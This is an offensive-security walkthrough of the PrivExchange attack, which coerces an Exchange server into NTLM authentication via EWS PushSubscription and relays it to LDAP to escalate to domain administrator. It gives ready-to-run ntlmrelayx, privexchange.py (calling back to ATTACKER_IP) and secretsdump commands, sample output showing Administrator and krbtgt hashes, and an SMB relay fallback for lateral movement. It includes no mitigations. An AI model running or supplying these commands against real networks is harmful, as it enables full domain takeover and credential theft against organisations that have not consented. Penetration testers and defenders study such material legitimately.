**PrivExchange** is an Active Directory privilege escalation attack that abuses the **Exchange PushSubscription feature** to coerce an Exchange server into authenticating to an attacker‑controlled system.

Because Microsoft Exchange typically runs with **high domain privileges**, the coerced authentication can be **relayed** to LDAP or other services to obtain **Domain Admin level access**.

---

## Root Cause

- Exchange exposes **Exchange Web Services (EWS)**.
    
- Any mailbox user can create a **PushSubscription**.
    
- The subscription forces Exchange to send HTTP callbacks.
    
- The attacker specifies a malicious listener URL.
    
- Exchange authenticates using **NTLM**.
    

Exchange service context:

```text
NT AUTHORITY\SYSTEM
```

Older Exchange installations (pre‑2019 CU updates):

- Exchange has **WriteDACL** permissions on the domain object.
    

---

## Attack Concept

```
Domain User
     ↓
Create PushSubscription
     ↓
Exchange authenticates outbound (NTLM)
     ↓
Attacker captures authentication
     ↓
NTLM relay → LDAP
     ↓
Modify domain ACL
     ↓
Grant DCSync rights
     ↓
Dump NTDS.dit → Domain Admin
```

---

## Requirements

- Valid domain user with mailbox
    
- Exchange server reachable
    
- NTLM relay possible
    
- LDAP signing NOT enforced (for LDAP relay path)
    

Optional:

- SMB/HTTP relay targets if LDAP unavailable
    

---

## Step 1 - Start NTLM Relay

Relay to LDAP on Domain Controller:

```bash
ntlmrelayx.py -t ldap://DC_IP --escalate-user attacker_user
```

Common options:

```bash
--dump-adcs
--delegate-access
--add-computer
```

---

## Step 2 - Trigger PrivExchange

Using `privexchange.py`:

```bash
python3 privexchange.py \
domain.local/user:Password@EXCHANGE_IP \
http://ATTACKER_IP
```

What happens:

- User authenticates to Exchange EWS
    
- PushSubscription created
    
- Exchange initiates HTTP auth to attacker
    
- NTLM authentication captured
    

---

### Step 3 - Relay Execution

`ntlmrelayx` receives authentication:

```text
[*] Authenticating against ldap://DC
[*] Success
[*] User privileges modified
```

LDAP relay typically performs:

- WriteDACL modification
    
- Grant DCSync permissions
    

---

## Step 4 - Dump Domain Credentials

```bash
secretsdump.py domain.local/attacker_user@DC_IP
```

Result:

```text
Administrator:500:NTLM_HASH
krbtgt:502:NTLM_HASH
```

Domain compromise achieved.

---

## If LDAP Relay Is Not Possible

PrivExchange can still be used to:

- Relay to SMB hosts
    
- Authenticate to web services
    
- Obtain privileged sessions
    
- Lateral movement
    

Example:

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```
